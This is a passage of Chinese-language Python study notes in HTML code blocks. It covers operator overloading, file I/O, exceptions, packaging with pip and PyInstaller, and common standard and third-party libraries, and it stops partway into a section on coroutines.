class="comment"># 向量相加（重载__add__）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Vector):</span><br><span class="line">            new_x = self.x + other.x</span><br><span class="line">            new_y = self.y + other.y</span><br><span class="line">            <span class="keyword">return</span> Vector(new_x, new_y)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;Unsupported operand type: &#123;&#125; and &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">type</span>(self), <span class="built_in">type</span>(other)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&#123;&#125;, &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(self.x, self.y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建两个向量对象</span></span><br><span class="line">v1 = Vector(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">v2 = Vector(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用+运算符将两个向量相加</span></span><br><span class="line">result = v1 + v2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出: (4, 6)</span></span><br></pre></td></tr></table></figure><hr><h2 id="七、存储"><a href="#七、存储" class="headerlink" title="七、存储"></a>七、存储</h2><h3 id="1-开关文件"><a href="#1-开关文件" class="headerlink" title="1 开关文件"></a>1 开关文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件（mode默认只读，encoding编码方式）</span></span><br><span class="line">myfile = <span class="built_in">open</span> ( filename [ , mode ] [ , encoding= ] )</span><br><span class="line"><span class="comment"># with会在完成工作后自动关闭文件，防止资源占用</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>() <span class="keyword">as</span> name </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">r/w/a：读写追加</span></span><br><span class="line"><span class="string">b：二进制形式</span></span><br><span class="line"><span class="string">+：以读/写方式打开</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#[, newline=None]：保证不同平台换行符被正确读入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">myfile.close()</span><br><span class="line"><span class="comment"># 缓冲区内容写入文件但不关闭文件</span></span><br><span class="line">myfile.flush()</span><br></pre></td></tr></table></figure><h3 id="2-读写数据"><a href="#2-读写数据" class="headerlink" title="2 读写数据"></a>2 读写数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读</span></span><br><span class="line"><span class="comment"># 全读，返回字符串，size限定字符或字节数</span></span><br><span class="line">read( [ size ] )</span><br><span class="line"><span class="comment"># 读一行，返回字符串，size限定当前行字符或字节数</span></span><br><span class="line">readline ( [ size ] )</span><br><span class="line"><span class="comment"># 读全行，返回行列表，hint限定行数</span></span><br><span class="line">readlines ( [ hint ] )</span><br><span class="line"><span class="comment"># 检查可读性</span></span><br><span class="line">readable()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写</span></span><br><span class="line"><span class="comment"># 写str进入文件</span></span><br><span class="line">write( <span class="built_in">str</span> )</span><br><span class="line"><span class="comment"># 写seq_of_str进入文件，seq_of_str为可迭代对象</span></span><br><span class="line">writelines( seq_of_str )</span><br><span class="line"><span class="comment"># 检查可写性</span></span><br><span class="line">writable()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指针</span></span><br><span class="line"><span class="comment"># 获得文件指针位置</span></span><br><span class="line">tell()</span><br><span class="line"><span class="comment"># offset：偏移量，whence：方向（0：从起始位置移动，1：从当前位置移动，2：从结束位置移动，默认0）</span></span><br><span class="line">seek( offset [ , whence ] )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读写对象</span></span><br><span class="line"><span class="comment">#对象写（写一个）</span></span><br><span class="line">pickle.dump( obj , file )</span><br><span class="line"><span class="comment"># 对象读（读一个）</span></span><br><span class="line">pickle.load( file )</span><br></pre></td></tr></table></figure><h3 id="3-os模块和os-path模块"><a href="#3-os模块和os-path模块" class="headerlink" title="3 os模块和os.path模块"></a>3 os模块和os.path模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#os.path</span></span><br><span class="line"><span class="comment"># 返回path绝对路径</span></span><br><span class="line">abspath( path )</span><br><span class="line"><span class="comment"># 返回path的目录</span></span><br><span class="line">dirname( path )</span><br><span class="line"><span class="comment"># path存在返回True否则False</span></span><br><span class="line">exists( path )</span><br><span class="line"><span class="comment"># 返回path最后存取时间</span></span><br><span class="line">getatime( path )</span><br><span class="line"><span class="comment"># 返回path最后修改时间</span></span><br><span class="line">getmtime( path )</span><br><span class="line"><span class="comment"># 返回path文件的大小（字节）</span></span><br><span class="line">getsize( path )</span><br><span class="line"><span class="comment"># path是否是绝对路径</span></span><br><span class="line">isabs( path )</span><br><span class="line"><span class="comment"># path是否是一个存在的目录</span></span><br><span class="line">isdir( path )</span><br><span class="line"><span class="comment"># path是否是一个存在的文件</span></span><br><span class="line">isfile( path )</span><br><span class="line"><span class="comment"># 将path分割成目录和文件名二元组返回</span></span><br><span class="line">split( path )</span><br><span class="line"><span class="comment"># 分离文件路径和扩展名</span></span><br><span class="line">splitext( path )</span><br><span class="line"><span class="comment"># 路径拼接</span></span><br><span class="line">join( <span class="built_in">str</span> , ... )</span><br><span class="line"></span><br><span class="line"><span class="comment"># os</span></span><br><span class="line"><span class="comment"># 当前Python脚本工作的路径</span></span><br><span class="line">os.getcwd()</span><br><span class="line"><span class="comment"># 返回指定目录下的所有文件和目录名</span></span><br><span class="line">os.listdir( path )</span><br><span class="line"><span class="comment"># 删除参数file指定的文件</span></span><br><span class="line">os.remove( file )</span><br><span class="line"><span class="comment"># 删除指定目录</span></span><br><span class="line">os.removedirs( path )</span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">os.rename( old , new )</span><br><span class="line"><span class="comment"># 创建单个目录</span></span><br><span class="line">os.mkdir( path )</span><br><span class="line"><span class="comment"># 获得文件属性</span></span><br><span class="line">os.stat( path )</span><br></pre></td></tr></table></figure><h3 id="4-CSV格式读写数据"><a href="#4-CSV格式读写数据" class="headerlink" title="4 CSV格式读写数据"></a>4 CSV格式读写数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br></pre></td></tr></table></figure><h3 id="5-序列化"><a href="#5-序列化" class="headerlink" title="5 序列化"></a>5 序列化</h3><blockquote><p>序列化：把复杂的数据结构变成一连串的字节</p><p>反序列化：把一连串的字节变成复杂的数据结构</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># json存取</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 写（获取的数据中有中文，设置ascii存储关闭，否则默认true）</span></span><br><span class="line">json.dump( data , fp , ensure_ascii=<span class="literal">False</span> )</span><br><span class="line"><span class="comment"># 读</span></span><br><span class="line">json.load( fp )</span><br><span class="line"><span class="comment"># 字符串变json</span></span><br><span class="line">res = json.loads( <span class="built_in">str</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 类的存取</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br></pre></td></tr></table></figure><hr><h2 id="八、异常"><a href="#八、异常" class="headerlink" title="八、异常"></a>八、异常</h2><h3 id="1-异常流程"><a href="#1-异常流程" class="headerlink" title="1 异常流程"></a>1 异常流程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可能会生成异常的代码段</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># 生成异常后的处理（异常名，多个用括号括起）（异常描述存在e中）</span></span><br><span class="line"><span class="keyword">except</span> [ ExceptionName ] [ <span class="keyword">as</span> e ]:</span><br><span class="line">  </span><br><span class="line"><span class="keyword">except</span> [ ExceptionName ]: </span><br><span class="line"><span class="comment"># 未发生异常时执行的代码段</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># 无论是否发生异常都执行的代码段</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br></pre></td></tr></table></figure><h3 id="2-异常类型"><a href="#2-异常类型" class="headerlink" title="2 异常类型"></a>2 异常类型</h3><blockquote><p>Exception：所有异常<br>BaseExcpettion：所有异常的根异常<br>GeneratorExit： 由生成器.close()方法引发<br>KeyboardInterrupt：由键盘中断（通常为Ctrl+C) 生成<br>SystemExit： 程序退出/终止<br>Exception： 所有非退出异常的基类<br>StopIteration： 引发后可停止迭代<br>StandardError ：所有内置异常的基类（仅在Python2中使用）<br>ArithmeticError ：算数异常的基类<br>FloatingPointError：浮点操作失败<br>ZeorDivisionError ：对0进行除或取模操作<br>AssertionError： 由assert语句引发<br>AttributeError ：当属性名称无效时引发<br>EnviromentError： 发生在Python外部的错误<br>IOError：I/O或文件相关的错误<br>OSError ：操作系统错误<br>EOFError ：到达文件结尾时引发<br>ImportError ：import语句失败<br>LookupError ：索引和键错误<br>IndexError ：超出序列索引的范围<br>KeyError ：字键盘不存在<br>MemoryError： 内存不足<br>NameError ：无法找到局部或全局名称<br>UnboundLocalError：未绑定的局部变量<br>ReferenceError：销毁被引用对象后使用的弱引用<br>RuntimeError ：一般运行时错误<br>NotImplementedError：没有实现的特性<br>SystaxError ：解析错误<br>IndentationError： 缩进错误<br>TabError ：使用不一致的制表符（由-tt选项生成）<br>SystemError： 解释器中的非致命系统错误<br>TypeError： 给操作传递了错误的类型<br>ValueError ：无效类型<br>UnicodeError： Unicode错误<br>UnicodeDecondeError： Unicode解码错误<br>UnicodeEncodeError ：Unicode编码错误<br>UnicodeTranslateError：Unicode转换错误<br>Warning：警告的基类<br>DeprecationWarning：关于被弃用的特征的警告<br>FutureWarning：关于构造将来语义会有改变的警告<br>OverflowWarning：旧的关于自动提升为长整型(long)的警告<br>PendingDeprecationWarning：关于特性将会被废弃的警告<br>RuntimeWarning：可疑的运行时行为(runtime behavior)的警告<br>SyntaxWarning：可疑的语法的警告<br>UserWarning：用户代码生成的警告</p></blockquote><h3 id="3-抛出异常"><a href="#3-抛出异常" class="headerlink" title="3 抛出异常"></a>3 抛出异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># raise 异常类名[ , 异常描述 ]</span></span><br><span class="line"><span class="comment"># raise 不带参数抛出刚刚抛出的异常</span></span><br><span class="line"><span class="keyword">raise</span> [Exception [, args [, traceback]]]</span><br></pre></td></tr></table></figure><h3 id="4-断言"><a href="#4-断言" class="headerlink" title="4 断言"></a>4 断言</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># assert（断言）用于判断一个表达式，在表达式条件为 false 的时候触发异常。</span></span><br><span class="line"><span class="keyword">assert</span> expression [, arguments]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断系统是否为Linux:</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&#x27;linux&#x27;</span> <span class="keyword">in</span> sys.platform), <span class="string">&quot;该代码只能在 Linux 下执行&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断系统是否为 win32:</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&#x27;win32&#x27;</span> <span class="keyword">in</span> sys.platform), <span class="string">&quot;win32&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-自定义异常"><a href="#5-自定义异常" class="headerlink" title="5 自定义异常"></a>5 自定义异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserDefinedException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, eid, message</span>):</span><br><span class="line">    self.eid = eid</span><br><span class="line">    self.message = message</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExceptionDemo</span> :</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">self, number</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;called compute(&quot;</span> + <span class="built_in">str</span>(number) + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> number &gt; <span class="number">500</span> <span class="keyword">or</span> number &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> UserDefinedException(<span class="number">101</span>, <span class="string">&quot;number out of bounds&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;normal exit&quot;</span>)</span><br><span class="line">myobject = ExceptionDemo()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    myobject.draw(<span class="number">125</span>)</span><br><span class="line">    myobject.draw(<span class="number">900</span>)</span><br><span class="line"><span class="keyword">except</span> UserDefinedException <span class="keyword">as</span> e :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception caught,id:&#123;&#125;,message:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(e.eid, e.message))</span><br></pre></td></tr></table></figure><hr><h2 id="九、导入包"><a href="#九、导入包" class="headerlink" title="九、导入包"></a>九、导入包</h2><h3 id="1-包定义"><a href="#1-包定义" class="headerlink" title="1 包定义"></a>1 包定义</h3><blockquote><p>包中含有模块。（文件夹（包）里有 <strong> init</strong>.py（初始化文件），hello.py（模块））</p><p>模块中含有函数库和类库。（函数和类）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单独运行</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;main&quot;</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 作为模块被调用</span></span><br><span class="line"><span class="keyword">elif</span> __name__ == <span class="string">&quot;module_name&quot;</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="2-pip指令"><a href="#2-pip指令" class="headerlink" title="2 pip指令"></a>2 pip指令</h3><blockquote><p><a href="https://pypi.org/project/pip/#files">official::pip安装</a></p><p><a href="https://pypi.org/project/setuptools/">official::setuptools安装</a></p><p><a href="https://www.runoob.com/w3cnote/pip-cn-mirror.html">镜像源</a> </p><ul><li>清华：<a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></li><li>中国科学技术大学 : <a href="https://pypi.mirrors.ustc.edu.cn/simple">https://pypi.mirrors.ustc.edu.cn/simple</a></li><li>豆瓣：<a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></li><li>阿里云：<a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></li></ul></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">pip &lt; command &gt; [ options ]</span><br><span class="line"></span><br><span class="line">pip -<span class="built_in">help</span>：帮助</span><br><span class="line">pip install name：安装包</span><br><span class="line">pip uninstall name：卸载包</span><br><span class="line">pip show name：查看包</span><br><span class="line">pip download name：下载但不安装包</span><br><span class="line">pip list：查看所有安装包</span><br><span class="line"></span><br><span class="line"># 使用豆瓣的镜像进行升级</span><br><span class="line">python -m pip install --upgrade pip -i http://pypi.douban.com/simple --trusted-host pypi.douban.com</span><br></pre></td></tr></table></figure><h3 id="3-导入包"><a href="#3-导入包" class="headerlink" title="3 导入包"></a>3 导入包</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 库 [<span class="keyword">as</span> alias]</span><br><span class="line"><span class="keyword">from</span> 库 <span class="keyword">import</span> 函数</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重命名list为List</span></span><br><span class="line"><span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">list</span> <span class="keyword">as</span> <span class="type">List</span></span><br></pre></td></tr></table></figure><h3 id="4-打包"><a href="#4-打包" class="headerlink" title="4 打包"></a>4 打包</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/380183243">链接</a></p></blockquote><h3 id="5-生成可执行文件"><a href="#5-生成可执行文件" class="headerlink" title="5 生成可执行文件"></a>5 生成可执行文件</h3><blockquote><p><a href="https://www.cnblogs.com/gopythoner/p/6337543.html">链接</a></p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">pip install PyInstaller</span><br><span class="line"></span><br><span class="line"># 普通打包</span><br><span class="line">pyinstaller -F myfile.py</span><br><span class="line">-i ico：装载图标（linux不行）</span><br><span class="line"></span><br><span class="line"># 窗口化应用程序作为单文件可执行文件</span><br><span class="line">pyinstaller --onefile --windowed myfile.py</span><br></pre></td></tr></table></figure><h3 id="6-标准库"><a href="#6-标准库" class="headerlink" title="6 标准库"></a>6 标准库</h3><blockquote><p><a href="https://docs.python.org/zh-cn/3/library/index.html">official::大全</a></p></blockquote><h4 id="6-1-do-cmd"><a href="#6-1-do-cmd" class="headerlink" title="6.1 do_cmd"></a>6.1 do_cmd</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">cmd = <span class="string">&#x27;ipconfig /all&#x27;</span></span><br><span class="line">res = os.popen(cmd)</span><br><span class="line">output_str = res.buffer.read().decode(encoding=<span class="string">&#x27;GB2312&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(output_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">obj = subprocess.run( </span><br><span class="line">cmd,</span><br><span class="line">stdin=subprocess.PIPE,</span><br><span class="line">stdout=subprocess.PIPE,</span><br><span class="line">stderr=subprocess.PIPE,</span><br><span class="line">universal_newlines=<span class="literal">True</span>,</span><br><span class="line">timeout=<span class="number">1</span> )</span><br><span class="line"><span class="built_in">print</span>( obj.stderr )  <span class="comment"># 输出异常信息</span></span><br><span class="line"><span class="built_in">print</span>( obj.stdout )  <span class="comment"># 程序没有异常，只输出空行</span></span><br></pre></td></tr></table></figure><h4 id="6-2-math"><a href="#6-2-math" class="headerlink" title="6.2 math"></a>6.2 math</h4><blockquote><p> <a href="https://www.runoob.com/python3/python-math.html">math库</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 排列</span></span><br><span class="line">math.perm(m,n) == A(m,n)（例：A(<span class="number">5</span>,<span class="number">3</span>) 为 <span class="number">5</span> * <span class="number">4</span> * <span class="number">3</span>）</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">math.comb(m,n) == C(m,n)</span><br><span class="line"><span class="comment"># 求质（最大公约数）</span></span><br><span class="line">math.gcd(m,n)</span><br></pre></td></tr></table></figure><h4 id="6-3-random"><a href="#6-3-random" class="headerlink" title="6.3 random"></a>6.3 random</h4><blockquote><p><a href="https://www.runoob.com/python3/python-random.html">random库</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># [0 , 1)的小数</span></span><br><span class="line">random.random()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [ start , end )的整数</span></span><br><span class="line">random.randrange( start , end , step )</span><br></pre></td></tr></table></figure><h4 id="6-4-datetime"><a href="#6-4-datetime" class="headerlink" title="6.4 datetime"></a>6.4 datetime</h4><blockquote><p> <a href="https://www.cnblogs.com/huigebj/p/11259449.html">datetime库①</a>    <a href="https://zhuanlan.zhihu.com/p/208291869">datetime库②</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 今日的日期</span></span><br><span class="line">datetime.date.today()</span><br><span class="line"><span class="comment"># 使用时间戳创建日期</span></span><br><span class="line">datetime.date.fromtimestamp(num) </span><br><span class="line"><span class="comment"># 使用公历序数创建的日期</span></span><br><span class="line">datetime.date.fromordinal(num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间推移(days,seconds)</span></span><br><span class="line">datetime.timedelta(days=num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当天日期</span></span><br><span class="line">now = datetime.datetime.strptime(date, <span class="string">&#x27;%Y-%m-%d&#x27;</span>).date()</span><br><span class="line"><span class="comment"># 日期加一</span></span><br><span class="line">now += datetime.timedelta(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="6-5-turtle"><a href="#6-5-turtle" class="headerlink" title="6.5 turtle"></a>6.5 turtle</h4><blockquote><p><a href="https://docs.python.org/zh-cn/3.7/library/turtle.html">turtle库</a></p></blockquote><h4 id="6-6-tkinter-GUI"><a href="#6-6-tkinter-GUI" class="headerlink" title="6.6 tkinter GUI"></a>6.6 tkinter GUI</h4><blockquote><p> <a href="https://www.runoob.com/python/python-gui-tkinter.html">tkinter GUI库</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line">t = turtle.Turtle()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爬行</span></span><br><span class="line">forward(n); backward(n) <span class="comment"># n：距离</span></span><br><span class="line"><span class="comment"># 转向</span></span><br><span class="line">left(a);right(a) <span class="comment"># a：角度</span></span><br><span class="line"><span class="comment"># 抬笔放笔</span></span><br><span class="line">penup();pendown()</span><br><span class="line"><span class="comment"># 笔属性</span></span><br><span class="line">pensize(s); pencolor(c)</span><br><span class="line"><span class="comment"># 隐藏箭头</span></span><br><span class="line">hideturtle()</span><br><span class="line"><span class="comment"># 结束作图</span></span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure><h4 id="6-7-hashlib"><a href="#6-7-hashlib" class="headerlink" title="6.7 hashlib"></a>6.7 hashlib</h4><ul><li><p>hashlib</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># 使用加密函数</span></span><br><span class="line">hashlib.func()</span><br><span class="line"><span class="comment"># func:md5,hash256,...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单使用</span></span><br><span class="line">obj = hashlib.md5()</span><br><span class="line"><span class="comment"># 编码，或者obj.update(b&quot;Hello&quot;)</span></span><br><span class="line">obj.update(<span class="string">&quot;Hello&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="built_in">print</span>(obj.hexdigest())</span><br></pre></td></tr></table></figure></li><li><p>hmac</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># 密钥，待加密字符串，加密hash函数</span></span><br><span class="line">mac = hmac.new(<span class="string">b&#x27;key&#x27;</span>,<span class="string">b&#x27;hello&#x27;</span>,hashlib.md5)</span><br><span class="line"><span class="comment"># 字符串的ascii码</span></span><br><span class="line"><span class="built_in">print</span>(mac.digest()) </span><br><span class="line"><span class="built_in">print</span>(mac.hexdigest()) </span><br></pre></td></tr></table></figure></li></ul><h4 id="6-8-结构化"><a href="#6-8-结构化" class="headerlink" title="6.8 结构化"></a>6.8 结构化</h4><p><strong>stuct</strong></p><blockquote><p><a href="https://blog.csdn.net/qq_30638831/article/details/80421019">struct详解</a></p><p>常用 fmt：</p><ul><li>i：int型</li></ul></blockquote><div class="table-container"><table><thead><tr><th>function</th><th>return</th><th>explain</th></tr></thead><tbody><tr><td>pack(fmt,v1,v2,…)</td><td>string</td><td>按格式把数据转化成字节流</td></tr><tr><td>pack(fmt,buffer,offset,v1,v2,…)</td><td>None</td><td>写入以offset开始的buffer中</td></tr><tr><td>unpack(fmt,v1,v2,…)</td><td>tuple</td><td>解包</td></tr><tr><td>pack_from(fmt,buffer,offset)</td><td>tuple</td><td>以offset开始解包</td></tr><tr><td>calcsize(fmt)</td><td>size of fmt</td><td>计算fmt占多少字节</td></tr></tbody></table></div>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>json</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="6-9-Urllib"><a href="#6-9-Urllib" class="headerlink" title="6.9 Urllib"></a>6.9 Urllib</h4><h4 id="6-10-itertools"><a href="#6-10-itertools" class="headerlink" title="6.10 itertools"></a>6.10 itertools</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="comment"># 迭代生成数字，start，step，__next__获得下一个数</span></span><br><span class="line">itertools.count(start=<span class="number">0</span>,step=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="7-三方库"><a href="#7-三方库" class="headerlink" title="7 三方库"></a>7 三方库</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/237294427">库导入</a></p></blockquote><h4 id="7-1-pygame"><a href="#7-1-pygame" class="headerlink" title="7.1 pygame"></a>7.1 pygame</h4><blockquote><p><a href="https://blog.csdn.net/cainiao_python/article/details/123267231">导弹追踪</a></p></blockquote><h4 id="7-2-pymssql"><a href="#7-2-pymssql" class="headerlink" title="7.2 pymssql"></a>7.2 pymssql</h4><blockquote><p>流程：</p><ol><li>链接数据库。</li><li>新建游标。</li><li>执行 sql 操作，用 try，except，无异常数据提交，有异常回滚。</li><li>关闭数据库。</li></ol></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">con = pymsssql.Connect(host,port,user,password,db)</span><br><span class="line"><span class="comment"># 创建游标</span></span><br><span class="line">cursor = con.cursor()</span><br><span class="line"><span class="comment"># 执行 sql 语句</span></span><br><span class="line">cursor.execute(<span class="string">&#x27;sql&#x27;</span>)</span><br><span class="line"><span class="comment"># 数据提交</span></span><br><span class="line">con.commit()</span><br><span class="line"><span class="comment"># 回滚</span></span><br><span class="line">con.rollback()</span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">cursor / con.close()</span><br></pre></td></tr></table></figure><h4 id="7-3-jieba"><a href="#7-3-jieba" class="headerlink" title="7.3 jieba"></a>7.3 jieba</h4><blockquote><p><a href="https://github.com/fxsjy/jieba">jieba库</a></p></blockquote><h4 id="7-4-cloudwords"><a href="#7-4-cloudwords" class="headerlink" title="7.4 cloudwords"></a>7.4 cloudwords</h4><blockquote><p><a href="https://www.cnblogs.com/snailclimb/p/9086436.html">cloudwords库</a></p></blockquote><h4 id="7-5-flask"><a href="#7-5-flask" class="headerlink" title="7.5 flask"></a>7.5 flask</h4><blockquote><p><a href="https://www.cnblogs.com/cleven/p/10858016.html">Flask Web</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 主网页</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_main</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"><span class="comment"># 子网页</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/bobo&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_bobo</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello bobo&#x27;</span></span><br><span class="line"><span class="comment"># 404错误</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_error</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;page not found&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"><span class="comment"># 非局域网访问</span></span><br><span class="line"><span class="comment"># app.run(debug=True,host=&#x27;0.0.0.0&#x27;,port=5000)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 打开外部html（文件必须在templates文件夹下）</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_main</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;site.html&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="7-6-Django"><a href="#7-6-Django" class="headerlink" title="7.6 Django"></a>7.6 Django</h4><blockquote><p><a href=".\c0eb71d0">text::Django</a></p></blockquote><hr><h2 id="十、协程"><a href="#十、协程" class="headerlink" title="十、协程"></a>十、协程</h2><blockquote><p>多线程</p><p><a href=".\c386cf1b">text::Python爬虫</a> </p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># async定义一个协程</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title 